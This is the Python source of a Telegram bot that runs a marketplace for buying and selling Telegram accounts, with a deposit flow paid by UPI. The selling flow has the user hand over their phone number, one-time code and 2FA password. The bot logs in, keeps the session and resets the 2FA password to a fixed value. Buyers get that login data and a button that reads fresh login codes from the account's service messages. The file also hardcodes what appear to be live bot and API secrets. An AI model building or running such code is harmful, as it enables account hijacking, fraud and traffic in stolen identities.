import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
import asyncio
import os
import threading
import re
from flask import Flask

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "BOT IS ONLINE"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run, daemon=True).start()

# --- CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes',
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
    'linked_bots': []
}
active_logins = {}

if not os.path.exists('sessions'): os.makedirs('sessions')

# --- HELPERS ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    return markup

# --- START ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    bot.send_message(message.chat.id, "🔥 **PRIME MASTER BOT v3.0**", reply_markup=main_menu())

# --- ADMIN POWER FEATURES ---
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if not is_admin(message.from_user.id): return
    text = (
        "👑 **ADMIN CONTROL PANEL**\n\n"
        "📈 **Stock/Rates:**\n"
        "🌍 `/addcountry COUNTRY BUY SELL` \n"
        "➕ `/addstock` (Bot Login Flow)\n\n"
        "👤 **User/Admin Mgmt:**\n"
        "➕ `/addadmin ID` | ➖ `/removeadmin ID`\n"
        "💰 `/addbal ID AMT` | 💳 `/setbal ID AMT`\n\n"
        "🔗 **Linking:**\n"
        "🤖 `/linkbot API_TOKEN` (Other bot link)\n\n"
        "📢 **Tools:**\n"
        "📣 `/broadcast` | 💳 `/changeupi UPI` | 📈 `/list`"
    )
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['addadmin'])
def add_adm(message):
    if message.from_user.id != OWNER_ID: return
    try:
        aid = int(message.text.split()[1])
        if aid not in db['admins']: db['admins'].append(aid)
        bot.reply_to(message, f"✅ Admin {aid} added.")
    except: bot.reply_to(message, "Usage: `/addadmin ID`")

@bot.message_handler(commands=['addbal'])
def add_balance(message):
    if not is_admin(message.from_user.id): return
    try:
        _, uid, amt = message.text.split()
        uid, amt = int(uid), int(amt)
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"🎁 Admin has added ₹{amt} to your balance!")
        bot.reply_to(message, f"✅ Done! User {uid} New Balance: {db['users'][uid]['balance']}")
    except: bot.reply_to(message, "Usage: `/addbal ID AMT`")

@bot.message_handler(commands=['linkbot'])
def link_other_bot(message):
    if not is_admin(message.from_user.id): return
    try:
        token = message.text.split()[1]
        db['linked_bots'].append(token)
        bot.reply_to(message, "🤖 Bot linked successfully! Other means enabled.")
    except: bot.reply_to(message, "Usage: `/linkbot API_TOKEN`")

# --- STOCK LOGIN (ADMIN) & SELL LOGIN (USER) ---
def login_worker(chat_id, phone, country, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country, 'mode': mode}
        bot.send_message(chat_id, "📩 **OTP Sent!** Code enter karein:")
        bot.register_next_step_handler_by_chat_id(chat_id, verify_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def verify_otp(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        finalize(message, d)
    except Exception as e:
        if "password" in str(e).lower():
            bot.send_message(message.chat.id, "🔐 Enter 2FA Password:")
            bot.register_next_step_handler_by_chat_id(message.chat.id, verify_2fa)
        else: bot.send_message(message.chat.id, "❌ OTP Wrong.")

def verify_2fa(message):
    pwd = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=pwd))
        finalize(message, d, pwd)
    except: bot.send_message(message.chat.id, "❌ Wrong 2FA.")

def finalize(message, d, pwd="No Password"):
    if d['mode'] == "sell":
        try: # Auto-2FA to 2710
            d['loop'].run_until_complete(d['client'](functions.account.UpdatePasswordSettingsRequest(
                new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="dob")
            )))
        except: pass
        uid = message.from_user.id
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sa_{uid}_{d['country']}"))
        for a in db['admins']: bot.send_message(a, f"📦 **SELL REQ**\nUser: `{uid}`\nNum: `{d['phone']}`\n2FA: `2710`", reply_markup=markup)
        bot.send_message(message.chat.id, "✅ Success! 2FA set to 2710. Wait for Admin Approval.")
    else:
        db['stock'][d['country']].append(f"{d['phone']}:PASS:{pwd}")
        bot.send_message(message.chat.id, f"✅ ID {d['phone']} added to {d['country']} stock.")

# --- DEPOSIT SYSTEM (FIXED WITH REJECT BUTTON) ---
@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def dep_start(message):
    msg = bot.send_message(message.chat.id, "💵 **Amount to Deposit:**")
    bot.register_next_step_handler(msg, dep_utr)

def dep_utr(message):
    try:
        amt = int(message.text)
        msg = bot.send_message(message.chat.id, f"💳 Pay to: `{db['upi']}`\n\nSend **12-digit UTR**:")
        bot.register_next_step_handler(msg, dep_ss, amt)
    except: bot.send_message(message.chat.id, "❌ Invalid Amount.")

def dep_ss(message, amt):
    utr = message.text.strip()
    if len(utr) != 12: return bot.send_message(message.chat.id, "❌ Invalid UTR.")
    msg = bot.send_message(message.chat.id, "📸 Send Screenshot:")
    bot.register_next_step_handler(msg, dep_final, amt, utr)

def dep_final(message, amt, utr):
    if message.content_type != 'photo': return bot.send_message(message.chat.id, "❌ Send Photo only.")
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"da_{uid}_{amt}"),
               types.InlineKeyboardButton("❌ REJECT", callback_data=f"dr_{uid}_{amt}"))
    for a in db['admins']:
        bot.send_photo(a, message.photo[-1].file_id, caption=f"🔔 **DEP REQ**\nUser: `{uid}`\nAmt: ₹{amt}\nUTR: `{utr}`", reply_markup=markup)
    bot.send_message(message.chat.id, "⏳ Sent to admins.")

# --- CALLBACK HANDLER (APPROVE/REJECT) ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    p = call.data.split('_')
    # Deposit Approve/Reject
    if p[0] == 'da':
        uid, amt = int(p[1]), int(p[2])
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"✅ ₹{amt} added to your balance!")
        bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'dr':
        uid = int(p[1])
        bot.send_message(uid, "❌ Your deposit request was REJECTED by admin.")
        bot.edit_message_caption("Rejected ❌", call.message.chat.id, call.message.message_id)
    
    # Sell Approve
    elif p[0] == 'sa':
        uid, country = int(p[1]), p[2]
        db['users'][uid]['balance'] += db['sell_rates'].get(country, 0)
        bot.send_message(uid, "✅ Sell Request Approved! Payment added.")
        bot.edit_message_text("Approved ✅", call.message.chat.id, call.message.message_id)
    
    # OTP/Logout Logic
    elif p[0] in ['gotp', 'lout']:
        action, phone = p[0], p[1]
        threading.Thread(target=otp_worker, args=(call, action, phone)).start()

def otp_worker(call, action, phone):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        if action == 'gotp':
            msgs = loop.run_until_complete(client.get_messages(777000, limit=1))
            if msgs:
                txt = msgs[0].message
                otp = re.search(r'\b(\d{5})\b', txt)
                code = otp.group(1) if otp else "Not Found"
                bot.send_message(call.from_user.id, f"📩 **OTP FOR {phone}:** `{code}`\n\nMsg: `{txt}`")
            else: bot.answer_callback_query(call.id, "No OTP found yet.", show_alert=True)
        elif action == 'lout':
            loop.run_until_complete(client.log_out())
            bot.send_message(call.from_user.id, f"✅ Logged out from {phone}!")
            if os.path.exists(f"sessions/{phone}.session"): os.remove(f"sessions/{phone}.session")
    except Exception as e: bot.send_message(call.from_user.id, f"❌ Error: {e}")
    finally: loop.run_until_complete(client.disconnect())

# --- STOCK MGMT ---
@bot.message_handler(commands=['addstock'])
def adm_stock_init(message):
    if not is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, "🌍 Country Name:")
    bot.register_next_step_handler(msg, adm_stock_phone)

def adm_stock_phone(message):
    c = message.text.upper()
    msg = bot.send_message(message.chat.id, "📞 Enter Number (+ sign):")
    bot.register_next_step_handler(msg, lambda m: threading.Thread(target=login_worker, args=(message.chat.id, m.text, c, "stock")).start())

# --- BUY SYSTEM ---
@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def buy_m(message):
    if not db['buy_rates']: return bot.send_message(message.chat.id, "❌ No Stock.")
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        markup.add(types.InlineKeyboardButton(f"{c} - ₹{p} ({len(db['stock'].get(c, []))})", callback_data=f"buyid_{c}"))
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('buyid_'))
def buy_exec(call):
    c = call.data.split('_')[1]
    uid = call.from_user.id
    price = db['buy_rates'].get(c, 0)
    if db['users'].get(uid, {}).get('balance', 0) < price or not db['stock'].get(c):
        return bot.answer_callback_query(call.id, "Low Balance/No Stock!", show_alert=True)
    
    data = db['stock'][c].pop(0)
    phone = data.split(':')[0]
    db['users'][uid]['balance'] -= price
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📩 GET OTP", callback_data=f"gotp_{phone}"),
               types.InlineKeyboardButton("🚪 LOGOUT BOT", callback_data=f"lout_{phone}"))
    bot.send_message(uid, f"🛒 **PURCHASE SUCCESS**\n\nID: `{data}`", reply_markup=markup)

# --- SELL SYSTEM ---
@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def sell_init(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_start(message):
    c = message.text.split()[1]
    msg = bot.send_message(message.chat.id, "📞 Enter Number (+ sign):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda m: threading.Thread(target=login_worker, args=(message.chat.id, m.text, c, "sell")).start())

bot.polling(none_stop=True)
